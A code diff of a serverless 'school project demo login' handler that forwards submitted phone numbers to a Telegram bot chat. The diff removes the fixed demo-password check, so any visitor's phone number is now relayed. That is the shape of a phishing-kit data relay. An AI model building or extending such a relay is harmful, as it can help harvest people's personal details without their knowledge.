@@ -1,22 +1,17 @@
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({
-      success: false,
-      message: "Method not allowed"
-    });
+    return res.status(405).json({ success: false });
   }
 
-  const { phone, demoPassword } = req.body || {};
+  const body = req.body || {};
+  const phone = typeof body.phone === "string"
+    ? body.phone.trim()
+    : "";
 
-  // Accept only the fixed school-project demo password
-  if (
-    typeof phone !== "string" ||
-    !phone.trim() ||
-    demoPassword !== "DEMO1234"
-  ) {
+  if (!phone) {
     return res.status(400).json({
       success: false,
-      message: "Invalid demo details"
+      message: "Phone number is required"
     });
   }
 
@@ -26,18 +21,18 @@ export default async function handler(req, res) {
   if (!BOT_TOKEN || !CHAT_ID) {
     return res.status(500).json({
       success: false,
-      message: "Server configuration missing"
+      message: "Missing Telegram configuration"
     });
   }
 
   const telegramMessage =
     "SCHOOL PROJECT - DEMO LOGIN\n\n" +
-    "Phone: " + phone.trim() + "\n" +
+    "Phone: " + phone + "\n" +
     "Password: DEMO1234\n" +
     "Status: Test submission received";
 
   try {
-    const telegramResponse = await fetch(
+    const response = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
@@ -51,19 +46,19 @@ export default async function handler(req, res) {
       }
     );
 
-    if (!telegramResponse.ok) {
-      throw new Error("Telegram notification failed");
+    if (!response.ok) {
+      return res.status(502).json({
+        success: false,
+        message: "Telegram delivery failed"
+      });
     }
 
-    return res.status(200).json({
-      success: true,
-      message: "Demo notification sent"
-    });
+    return res.status(200).json({ success: true });
 
   } catch (error) {
     return res.status(500).json({
       success: false,
-      message: "Unable to send notification"
+      message: "Server error"
     });
   }
 }
